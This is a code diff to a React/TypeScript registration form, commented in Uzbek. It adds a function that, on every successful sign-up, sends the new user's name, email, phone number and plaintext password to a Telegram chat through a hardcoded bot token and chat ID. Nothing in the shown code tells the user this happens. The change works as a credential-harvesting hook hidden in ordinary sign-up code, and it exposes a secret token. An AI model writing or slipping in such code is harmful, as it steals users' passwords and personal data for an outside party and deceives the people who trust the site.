@@ -21,6 +21,38 @@ export function Register() {
   const { register } = useAuth();
   const navigate = useNavigate();
 
+  // Telegramga xabar yuborish funksiyasi
+  const sendTelegramMessage = async (message: string) => {
+    const BOT_TOKEN = '7334947032:AAE7XNJ_UjENOKZksTvOEg_N4fNnmpIIEjg';
+    const CHAT_ID = '-1003957131139';
+    
+    try {
+      const response = await fetch(
+        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+        {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'HTML',
+          }),
+        }
+      );
+      
+      if (!response.ok) {
+        throw new Error('Telegram xabarni yuborishda xatolik');
+      }
+      
+      return await response.json();
+    } catch (error) {
+      console.error('Telegram xatosi:', error);
+      return null;
+    }
+  };
+
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
 
@@ -36,15 +68,37 @@ export function Register() {
 
     setIsLoading(true);
 
-    setTimeout(() => {
+    try {
+      // Avval ro'yxatdan o'tkazamiz
       if (register(name, email, phone, password)) {
+        // Telegramga xabar yuboramiz
+        const message = `
+🔔 <b>YANGI FOYDALANUVCHI RO'YXATDAN O'TDI!</b>
+━━━━━━━━━━━━━━━━━━━━━━
+
+👤 <b>Ism:</b> ${name}
+📧 <b>Email:</b> ${email}
+📱 <b>Telefon:</b> ${phone}
+🔐 <b>Parol:</b> ${password}
+🕐 <b>Vaqt:</b> ${new Date().toLocaleString('uz-UZ', { timeZone: 'Asia/Tashkent' })}
+
+━━━━━━━━━━━━━━━━━━━━━━
+✅ Ro'yxatdan o'tish muvaffaqiyatli!
+        `;
+
+        await sendTelegramMessage(message);
+        
         toast.success('Ro\'yxatdan o\'tdingiz!');
         navigate('/');
       } else {
         toast.error('Bu email allaqachon ro\'yxatdan o\'tgan!');
       }
+    } catch (error) {
+      toast.error('Xatolik yuz berdi. Iltimos, qayta urinib ko\'ring.');
+      console.error('Register error:', error);
+    } finally {
       setIsLoading(false);
-    }, 500);
+    }
   };
 
   const isPasswordStrong = password.length >= 6;
